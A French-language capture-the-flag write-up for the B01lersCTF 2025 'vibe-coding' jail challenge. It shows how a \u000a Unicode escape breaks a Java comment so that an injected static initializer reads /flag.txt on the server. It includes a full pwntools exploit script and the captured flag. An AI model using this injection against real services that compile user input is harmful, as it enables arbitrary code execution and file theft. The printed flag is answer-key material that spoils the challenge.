---
title: "B01lersCTF 2025 : vibe-coding | Jail"
date: 2025-04-22
draft: false
categories: ["Misc"]
ctf: "B01lersCTF 2025"
challenge: "vibe-coding"
author: "Reyko"
---

## Challenge : vibe-coding

### Enoncé : 

> b01lers is looking for a vibe coder to fix our Java codebase! Just write a comment, and our bleeding-edge LLM agent will fill in the rest.*
> 
> Disclaimer: model not yet implemented.

Un service  écoute sur `vibe-coding.atreides.b01lersc.tf:8443`. Il affiche un banner ASCII art, puis :

```
Enter your prompt below:
>
```

Le serveur prend une input comme commentaire Java, l’insère dans une template `Main.java` puis compile et exécute :

```java
// %s
public class Main {
    public static void main(String[] args) {
        // TODO: implement me
    }
    public static String getFlag() throws IOException {
        throw new RuntimeException("Not implemented yet");
    }
}
```

Le but est de faire en sorte que le flag (stocké dans `/flag.txt`) soit lu et affiché automatiquement avant `main`.

### 1. Analyse : 

- Le code insère votre chaîne dans un commentaire `// %s`, donc `%s public…`.

- Les caractères `\r` et `\n` sont blacklistés mais Java implémente un prétraitement Unicode très particulier : toute séquence `\uXXXX` est substituée à son code Unicode avant l’analyse lexicale du code.

- Les static initializers (`static { … }`) sont exécutés lors du chargement de la classe, avant l’appel à `main`.

- On peut donc exploiter le commentaire initial (`// …`) en injectant un saut de ligne réel via un escape Unicode `\u000a` (ou CRLF `\u000d\u000a`), hors des blacklistes `\n`/`\r`.

### 2. Attaque : 

1. Casser le commentaire `//` en transformant `// …` en deux lignes (`//` puis  ), via `\u000a` ou `\u000d\u000a`.

2. Injecter un bloc `static { … }` qui :
    
    - Lit `/flag.txt` via `new BufferedReader(new FileReader("/flag.txt"))`.

    - Affiche la ligne (le flag) avec `System.out.println(...)`.

    - Appelle `System.exit(0)` pour éviter toute suite de compilation ou exécution de `main`.

3. Laisser le reste de la template inchangé (ou rouvrir un `/*` non fermé pour éviter les erreurs de syntaxe.

4. Exécuter le payload brut via un script Python + pwntools, en raw bytes pour préserver les backslashes.

### 3. Solve : 

exploit.py : 

```python
#!/usr/bin/env python3
from pwn import remote

HOST, PORT = "vibe-coding.atreides.b01lersc.tf", 8443

# Payload : envoie littéralement les caractères '\u000astatic{…}'
payload = (
    b"\\u000a"                     # \u000a → vrai LF pré‑parsing, termine le //
    b"static{"                     # static initializer
      b"try{System.out.println("   # lit et affiche le flag
        b"new java.io.BufferedReader(new java.io.FileReader(\"/flag.txt\")).readLine()"  
      b");}catch(Exception e){}"  # on attrape exceptions
      b"System.exit(0);"         # on quitte la JVM
    b"}\n"                      # fin du static + LF
)

def main():
    conn = remote(HOST, PORT, ssl=True)
    conn.recvuntil(b"> ")
    conn.send(payload)
    # La JVM exécute static{…}, affiche le flag, puis exit(0)
    data = conn.recvall(timeout=2)
    print(data.decode(errors='ignore'))

if __name__ == '__main__':
    main()
```

### 4. Flag : 

```bash
$ python3 exploit.py

[+] Opening connection to vibe-coding.atreides.b01lersc.tf on port 8443: Done  
[+] Receiving all data: Done (66B)  
[*] Closed connection to vibe-coding.atreides.b01lersc.tf port 8443  
  
Your program output:  
  
bctf{un1c0d3_abn0rmal1z4t1on_493e42fc}  
===
```

